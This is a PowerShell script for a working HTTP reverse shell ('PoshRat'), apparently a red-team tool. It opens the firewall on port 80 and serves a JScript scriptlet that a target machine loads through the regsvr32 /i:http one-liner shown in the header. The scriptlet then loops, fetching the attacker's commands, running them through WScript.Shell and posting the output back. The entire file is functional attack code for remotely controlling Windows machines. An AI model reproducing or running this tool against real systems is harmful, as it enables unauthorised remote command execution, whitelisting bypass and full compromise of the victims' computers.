<#
    
  Author: Casey Smith @subTee
  License: BSD3-Clause
	
  .SYNOPSIS
  
  Simple Reverse Shell over HTTP. Execute Commands on Client.  
  
  "regsvr32 /u /n /s /i:http://127.0.0.1/file.sct scrobj.dll"
  
  Listening Server IP Address
  
#>

$Server = '127.0.0.1' #Listening IP. Change This.

function Receive-Request {
   param(      
      $Request
   )
   $output = ""
   $size = $Request.ContentLength64 + 1   
   $buffer = New-Object byte[] $size
   do {
      $count = $Request.InputStream.Read($buffer, 0, $size)
      $output += $Request.ContentEncoding.GetString($buffer, 0, $count)
   } until($count -lt $size)
   $Request.InputStream.Close()
   write-host $output
}

$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add('http://+:80/') 

netsh advfirewall firewall delete rule name="PoshRat 80" | Out-Null
netsh advfirewall firewall add rule name="PoshRat 80" dir=in action=allow protocol=TCP localport=80 | Out-Null

$listener.Start()
'Listening ...'
while ($true) {
    $context = $listener.GetContext() # blocks until request is received
    $request = $context.Request
    $response = $context.Response
	$hostip = $request.RemoteEndPoint
	#Use this for One-Liner Start
	
	if ($request.Url -match '/file.sct$' -and ($request.HttpMethod -eq "GET")) {  
        $message = '<?XML version="1.0"?>
					<scriptlet>
					<registration
						description="DebugShell"
						progid="DebugShell"
						version="1.00"
						classid="{90001111-0000-0000-0000-0000FEEDACDC}"
						>
						
						<script language="JScript">
							<![CDATA[
							
								while(true)
								{
									try
									{
									 	//Expects to run behind a proxy... Deal with it. 
									 	//Uncomment.
										w = new ActiveXObject("WScript.Shell");
										//v = w.RegRead("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ProxyServer");
										//q = v.split("=")[1].split(";")[0];
										h = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
										//h.SetProxy(2,q);
										h.Open("GET","http://'+$Server+'/rat",false);
										h.Send();
										c = h.ResponseText;
										r = new ActiveXObject("WScript.Shell").Exec(c);
										var so;
										while(!r.StdOut.AtEndOfStream){so=r.StdOut.ReadAll()}
										p = new ActiveXObject("WinHttp.WinHttpRequest.5.1");														
										//p.SetProxy(2,q);
										p.Open("POST","http://'+$Server+'/rat",false);
										p.Send(so);
									}
									catch(err)
									{
										continue;
									}
								}
						
							]]>
					</script>
					</registration>
					<public>
							<method name="Exec"></method>
					</public>
						<script language="JScript">
						<![CDATA[
							
							function Exec()
							{
								var r = new ActiveXObject("WScript.Shell").Run("cmd.exe");
							}
							
						]]>
						</script>
					
					
					
					</scriptlet>
					
		'

    }		
	
	if ($request.Url -match '/rat$' -and ($request.HttpMethod -eq "POST") ) { 
		Receive-Request($request)	
	}
    if ($request.Url -match '/rat$' -and ($request.HttpMethod -eq "GET")) {  
        $response.ContentType = 'text/plain'
        $message = Read-Host "JS $hostip>"		
    }
    

    [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message)
    $response.ContentLength64 = $buffer.length
    $output = $response.OutputStream
    $output.Write($buffer, 0, $buffer.length)
    $output.Close()
}

$listener.Stop()
